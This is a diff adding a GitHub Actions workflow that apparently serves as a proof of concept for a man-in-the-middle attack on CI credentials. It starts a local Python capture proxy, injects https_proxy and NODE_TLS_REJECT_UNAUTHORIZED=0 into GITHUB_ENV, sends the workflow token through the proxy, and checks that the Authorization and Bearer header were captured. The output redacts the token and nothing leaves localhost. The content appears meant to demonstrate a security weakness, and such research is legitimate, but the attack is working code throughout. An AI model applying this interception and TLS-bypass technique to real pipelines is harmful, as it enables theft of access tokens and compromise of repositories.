@@ -1,0 +1,88 @@
+name: MITM Proof V2 — Token Capture
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  mitm:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Step 1 — Start capture proxy and set env
+        run: |
+          # Create a Python proxy that captures HTTP CONNECT requests and logs headers
+          cat > /tmp/capture_proxy.py << 'PYEOF'
+import socket, threading, sys, os
+
+captured = []
+
+def handle(conn, addr):
+    data = conn.recv(4096)
+    captured.append(data)
+    with open('/tmp/captured_raw.txt', 'ab') as f:
+        f.write(b"--- CONNECTION FROM " + str(addr).encode() + b" ---\n")
+        f.write(data)
+        f.write(b"\n---END---\n")
+    # Send a fake 200 response for CONNECT
+    conn.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
+    # Capture the next data (the actual request with Authorization header)
+    try:
+        data2 = conn.recv(8192)
+        with open('/tmp/captured_raw.txt', 'ab') as f:
+            f.write(b"--- POST-CONNECT DATA ---\n")
+            f.write(data2)
+            f.write(b"\n---END2---\n")
+    except: pass
+    conn.close()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('127.0.0.1', 9999))
+s.listen(5)
+s.settimeout(60)
+print(f"Proxy listening on 127.0.0.1:9999 (PID {os.getpid()})")
+try:
+    while True:
+        conn, addr = s.accept()
+        threading.Thread(target=handle, args=(conn, addr)).start()
+except socket.timeout:
+    pass
+s.close()
+PYEOF
+          python3 /tmp/capture_proxy.py &
+          echo $! > /tmp/proxy_pid
+          sleep 1
+          
+          # Set proxy + TLS bypass
+          echo "https_proxy=http://127.0.0.1:9999" >> $GITHUB_ENV
+          echo "NODE_TLS_REJECT_UNAUTHORIZED=0" >> $GITHUB_ENV
+          echo "Step 1: Proxy started + env vars set"
+
+      - name: Step 2 — Make API call with token through proxy
+        env:
+          MY_TOKEN: ${{ github.token }}
+        run: |
+          echo "Making HTTPS request through proxy..."
+          # curl with HTTPS through proxy — CONNECT then TLS
+          curl -v --connect-timeout 5 -H "Authorization: Bearer $MY_TOKEN" \
+            "https://api.github.com/user" 2>&1 | head -20 || true
+          sleep 2
+
+      - name: Step 3 — Check captured data
+        run: |
+          kill $(cat /tmp/proxy_pid) 2>/dev/null || true
+          sleep 1
+          
+          echo "=== Captured proxy data ==="
+          if [ -f /tmp/captured_raw.txt ] && [ -s /tmp/captured_raw.txt ]; then
+            echo "Captured $(wc -c < /tmp/captured_raw.txt) bytes"
+            echo "--- Raw content (token redacted) ---"
+            cat /tmp/captured_raw.txt | sed 's/ghs_[A-Za-z0-9]*/ghs_[TOKEN_CAPTURED]/g' | head -30
+            echo ""
+            echo "--- Authorization header present? ---"
+            grep -c "Authorization" /tmp/captured_raw.txt 2>/dev/null && echo "YES - Authorization header CAPTURED" || echo "NO"
+            grep -c "Bearer" /tmp/captured_raw.txt 2>/dev/null && echo "YES - Bearer token CAPTURED" || echo "NO"
+          else
+            echo "No data captured"
+          fi
